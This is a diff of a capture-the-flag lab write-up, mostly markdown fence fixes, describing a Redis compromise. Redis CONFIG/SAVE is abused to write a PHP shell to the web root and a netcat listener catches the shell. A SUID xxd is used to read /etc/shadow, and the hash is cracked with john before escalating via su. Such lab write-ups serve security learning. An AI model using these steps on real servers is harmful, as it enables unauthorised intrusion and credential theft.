@@ -2,7 +2,9 @@
 
 
 **Date:** [21/05/2025]  
+
 **Difficulty:** [Easy]  
+
 **Objective:** Hack into a vulnerable database server with an in-memory data-structure in this semi-guided challenge!
 
 ---
@@ -68,12 +70,12 @@ PORT     STATE SERVICE VERSION
  Redis Access:
 
     Include commands/tools used:
-´´´
+```
     redis-cli -h 10.10.171.200 -p 6379
 
     10.10.171.200:6379> help
     redis-cli 7.0.15
-
+```  
 To get help about Redis commands type:
      "help @<group>" to get a list of commands in <group>
       "help <command>" for help on <command>
@@ -88,7 +90,7 @@ Set your preferences in ~/.redisclirc`
 
 Checked if Writing Files allowed and created a shell payload:
 
-´´´
+```
 10.10.171.200:6379> config set dir /var/www/html
 OK
 10.10.171.200:6379> config set dbfilename shell.php
@@ -97,12 +99,12 @@ OK
 OK
 10.10.171.200:6379> save
 OK
-´´´
+```
 
 Created a listener:
-´´´
+```
 nc -lvnp 4444
-´´´
+```
 
 Gained Access As: www-data
 
@@ -116,7 +118,8 @@ Gained Access As: www-data
     Tool Used: xxd, GTFOBins
 
     Commands:
-´´´
+    
+```
 whoami
 sudo -l
 ls -la
@@ -124,28 +127,28 @@ ls /home/vianka
 env
 cat /etc/crontab
 find / -perm -4000 -type f 2>/dev/null
-´´´
+```
 
 Findings:
 
-´´´´
+```
 First flag in: /home/vianka/user.txr
-´´´
+```
 
-
+```
 /usr/bin/xxd
 
 GTOFBins:
 LFILE=/etc/shadow
 xxd "$LFILE" | xxd -r
-
+```
 Now, able to read the /etc/shadow file:
-´´´
+```
 vianka:$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0:18507:0:99999:7:::
-´´´
+```
 
 To crack the password:
-´´´
+```
 echo '$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0' > shadow.txt
 john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
 sing default input encoding: UTF-8
@@ -157,9 +160,10 @@ beautiful1       (?)
 1g 0:00:00:00 DONE (2025-05-21 10:22) 1.886g/s 2415p/s 2415c/s 2415C/s kucing..poohbear1
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
-´´´ 
+```
+```
 su vianka
-´´´
+```
 
 Escalated To: vianka
 
@@ -202,5 +206,7 @@ Escalated To: vianka
 
     Tools used: nmap, redis-cli, xxd
 
-    Lessons learned: [Used Redis to drop a PHP reverse shell in the web root by abusing CONFIG and SAVE; xxd was incorrectly SUID — uncommon and dangerous. Misconfigurations are low-hanging fruit — but they’re often all it takes.]
-    Lessons learned: [Add reflections]
+    Lessons learned: [Used Redis to drop a PHP reverse shell in the web root by abusing CONFIG and SAVE; 
+    xxd was incorrectly SUID — uncommon and dangerous. 
+    Misconfigurations are low-hanging fruit — but they’re often all it takes.]
+   
